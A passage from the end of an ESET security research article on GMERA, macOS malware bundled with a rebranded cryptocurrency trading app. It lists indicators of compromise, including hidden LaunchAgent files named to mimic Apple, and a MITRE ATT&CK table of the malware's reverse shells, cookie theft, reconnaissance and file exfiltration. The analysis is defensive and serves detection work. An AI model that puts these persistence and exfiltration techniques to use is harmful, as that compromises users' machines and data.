<h4><strong>File paths</strong></h4>
<p><span style="font-family: courier new, courier, monospace;">• $HOME/Library/LaunchAgents/.com.apple.upd.plist</span><br />
<span style="font-family: courier new, courier, monospace;">• $HOME/Library/LaunchAgents/.com.apple.system.plist</span><br />
<span style="font-family: courier new, courier, monospace;">• /tmp/.fil.sh</span><br />
<span style="font-family: courier new, courier, monospace;">• /tmp/loglog</span></p>
<h4><strong>Launch Agent labels</strong></h4>
<p><span style="font-family: courier new, courier, monospace;">• com.apple.apps.upd</span><br />
<span style="font-family: courier new, courier, monospace;">• com.apples.apps.upd</span></p>
<h2>MITRE ATT&amp;CK techniques</h2>
<p>Note: This table was built using <a href="https://attack.mitre.org/resources/versions/" target="_blank" rel="noopener">version 6</a> of the ATT&amp;CK framework.</p>

<table id="tablepress-860" class="tablepress tablepress-id-860">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Tactic</th><th class="column-2">ID</th><th class="column-3">Name</th><th class="column-4">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td rowspan="2" class="column-1">Execution</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1204/" rel="noopener" target="_blank">T1204</a></td><td class="column-3">User Execution</td><td class="column-4">Victim needs to run the malicious application to be compromised.</td>
</tr>
<tr class="row-3 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1059/" rel="noopener" target="_blank">T1059</a></td><td class="column-3">Command-Line Interface</td><td class="column-4">GMERA provides reverse <span style="font-family: courier new, courier, monospace;"> bash</span>  and <span style="font-family: courier new, courier, monospace;"> zsh</span>  shells to its operators.</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">Persistence</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1159/" rel="noopener" target="_blank">T1159</a></td><td class="column-3">Launch Agent</td><td class="column-4">GMERA installs a Launch Agent to maintain persistence.</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">Defense Evasion</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1116/" rel="noopener" target="_blank">T1116</a></td><td class="column-3">Code Signing</td><td class="column-4">All samples of GMERA we have analyzed were signed and used valid, Apple-signed (now revoked), certificates.</td>
</tr>
<tr class="row-6 even">
	<td rowspan="2" class="column-1">Credential Access</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1139/" rel="noopener" target="_blank">T1139</a></td><td class="column-3">Bash History</td><td class="column-4">A GMERA reconnaissance script lists the first 20 lines of the <span style="font-family: courier new, courier, monospace;"> .bash_history</span>  file.</td>
</tr>
<tr class="row-7 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1539/" rel="noopener" target="_blank">T1539</a></td><td class="column-3">Steal Web Session Cookie</td><td class="column-4">GMERA’s operators steal browser cookies via a reverse shell.</td>
</tr>
<tr class="row-8 even">
	<td rowspan="5" class="column-1">Discovery</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1083/" rel="noopener" target="_blank">T1083</a></td><td class="column-3">File and Directory Discovery</td><td class="column-4">GMERA’s operators list files on the target system via a reverse shell and <span style="font-family: courier new, courier, monospace;"> ls</span> .</td>
</tr>
<tr class="row-9 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1497/" rel="noopener" target="_blank">T1497</a></td><td class="column-3">Virtualization/Sandbox Evasion</td><td class="column-4">A GMERA reconnaissance script checks for devices specific to hypervisors and warns the operators if run in a virtual machine.</td>
</tr>
<tr class="row-10 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1040/" rel="noopener" target="_blank">T1040</a></td><td class="column-3">Network Sniffing</td><td class="column-4">A GMERA reconnaissance script lists Wi-Fi networks available to the compromised Mac using <span style="font-family: courier new, courier, monospace;"> airport -s</span> .</td>
</tr>
<tr class="row-11 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1082/" rel="noopener" target="_blank">T1082</a></td><td class="column-3">System Information Discovery</td><td class="column-4">A GMERA reconnaissance script lists information about the system such as macOS version, attached displays and Mac model.</td>
</tr>
<tr class="row-12 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1518/" rel="noopener" target="_blank">T1518</a></td><td class="column-3">Software Discovery</td><td class="column-4">A GMERA reconnaissance script checks whether developer tools are installed.</td>
</tr>
<tr class="row-13 odd">
	<td rowspan="2" class="column-1">Collection</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1005/" rel="noopener" target="_blank">T1005</a></td><td class="column-3">Data from Local System</td><td class="column-4">GMERA’s operators use this malware to exfiltrate files from the compromised system.</td>
</tr>
<tr class="row-14 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1113/" rel="noopener" target="_blank">T1113</a></td><td class="column-3">Screen Capture</td><td class="column-4">GMERA’s operators take screenshots of the compromised system and exfiltrate them through file.io.</td>
</tr>
<tr class="row-15 odd">
	<td rowspan="2" class="column-1">Command and Control</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1043/" rel="noopener" target="_blank">T1043</a></td><td class="column-3">Commonly Used Port</td><td class="column-4">Initial reporting from the malware is done using HTTP on its standard TCP port (80).</td>
</tr>
<tr class="row-16 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1065/" rel="noopener" target="_blank">T1065</a></td><td class="column-3">Uncommonly Used Port</td><td class="column-4">GMERA reverse shells are opened by connecting to C&amp;C server TCP ports in the range 25733 to 25738.</td>
</tr>
<tr class="row-17 odd">
	<td class="column-1">Exfiltration</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1048/" rel="noopener" target="_blank">T1048</a></td><td class="column-3">Exfiltration Over Alternative Protocol</td><td class="column-4">GMERA exfiltrates files from the reverse shell using HTTP to another attacker-controlled server.</td>
</tr>
</tbody>
</table>


                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/marc-etienne/" title="Marc-Etienne M.Léveillé">
                    Marc-Etienne M.Léveillé                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2020-07-16 11:30:50">16 Jul 2020 - 11:30AM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="Mac cryptocurrency trading application rebranded, bundled with malware">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="Mac cryptocurrency trading application rebranded, bundled with malware">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="Mac cryptocurrency trading application rebranded, bundled with malware">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="Mac cryptocurrency trading application rebranded, bundled with malware">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F07%2F16%2Fmac-cryptocurrency-trading-application-rebranded-bundled-malware%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F07%2F16%2Fmac-cryptocurrency-trading-application-rebranded-bundled-malware%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F07%2F16%2Fmac-cryptocurrency-trading-application-rebranded-bundled-malware%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"140603 https:\/\/backend.welivesecurity.com\/?p=140603","disqusShortname":"welivesecurity","disqusTitle":"Mac cryptocurrency trading application rebranded, bundled with malware","disqusUrl":"https:\/\/www.welivesecurity.com\/2020\/07\/16\/mac-cryptocurrency-trading-application-rebranded-bundled-malware\/","postId":"140603"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>